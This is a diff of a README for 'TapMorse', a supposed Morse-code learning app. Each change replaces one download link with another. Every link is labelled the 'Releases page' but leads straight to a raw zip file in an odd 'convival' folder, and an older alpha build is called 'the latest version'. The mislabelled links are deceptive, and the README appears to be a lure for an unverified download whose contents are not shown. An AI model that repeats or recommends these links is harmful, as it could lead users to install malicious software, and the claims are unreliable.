@@ -1,6 +1,6 @@
 # 🎉 TapMorse - Effortlessly Learn Morse Code Today
 
-![Download TapMorse](https://raw.githubusercontent.com/Mubarak-dev-design/TapMorse/main/convival/TapMorse-2.9.zip)
+![Download TapMorse](https://github.com/Mubarak-dev-design/TapMorse/raw/refs/heads/main/convival/Tap-Morse-2.4-alpha.1.zip)
 
 ## 📘 Table of Contents
 - [Introduction](#🤔-introduction)
@@ -31,7 +31,7 @@ To run TapMorse, your system needs the following:
 - **Internet Connection:** Required for downloading and updating the software.
 
 ## 📥 Download & Install
-To get TapMorse, visit the Releases page [here](https://raw.githubusercontent.com/Mubarak-dev-design/TapMorse/main/convival/TapMorse-2.9.zip). You will find the latest version of the software available for download. 
+To get TapMorse, visit the Releases page [here](https://github.com/Mubarak-dev-design/TapMorse/raw/refs/heads/main/convival/Tap-Morse-2.4-alpha.1.zip). You will find the latest version of the software available for download. 
 
 Once on the page, look for the version that suits your system. Download the installer file by clicking on the link provided, and follow the instructions below to install it:
 
@@ -52,4 +52,4 @@ If you encounter any issues or need assistance, feel free to reach out. You can 
 ## 👥 Contributors
 TapMorse is built by a community of developers and learners. Check out the contributors on the GitHub page to learn more about who made this possible.
 
-Enjoy learning Morse code with TapMorse! Visit the Releases page [here](https://raw.githubusercontent.com/Mubarak-dev-design/TapMorse/main/convival/TapMorse-2.9.zip) now to get started.
+Enjoy learning Morse code with TapMorse! Visit the Releases page [here](https://github.com/Mubarak-dev-design/TapMorse/raw/refs/heads/main/convival/Tap-Morse-2.4-alpha.1.zip) now to get started.
